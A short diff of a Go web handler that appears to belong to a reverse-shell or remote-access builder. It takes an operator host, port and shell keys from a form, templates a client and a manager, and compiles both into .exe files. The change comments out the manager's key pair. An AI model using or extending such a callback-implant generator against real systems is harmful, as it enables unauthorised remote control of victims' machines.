@@ -172,12 +172,12 @@ func butyindex(httpw http.ResponseWriter, req *http.Request) {
 		lport := req.Form.Get("lport")
 		butyclientpvtkey := req.Form.Get("shellpvtkey")
 		butyclientpubkey := req.Form.Get("shellpubkey")
-		butymngrpvtkey := req.Form.Get("mngrpvtkey")
-		butymngrpubkey := req.Form.Get("mngrpubkey")
+		//butymngrpvtkey := req.Form.Get("mngrpvtkey")
+		//butymngrpubkey := req.Form.Get("mngrpubkey")
 
-		updatetemplate("basefiles/butwhyclient.go", "download/butwhyclient.go", lhost+":"+lport, butyclientpvtkey, butymngrpubkey)
+		updatetemplate("basefiles/butwhyclient.go", "download/butwhyclient.go", lhost+":"+lport, butyclientpvtkey, "")
 		buildexe("download/"+saveas+".exe", "download/butwhyclient.go")
-		updatetemplate("basefiles/butwhymanager.go", "download/butwhymanager.go", lport, butymngrpvtkey, butyclientpubkey)
+		updatetemplate("basefiles/butwhymanager.go", "download/butwhymanager.go", lport, "", butyclientpubkey)
 		buildexe("download/butymanager.exe", "download/butwhymanager.go")
 
 		time.Sleep(5000 * time.Millisecond)
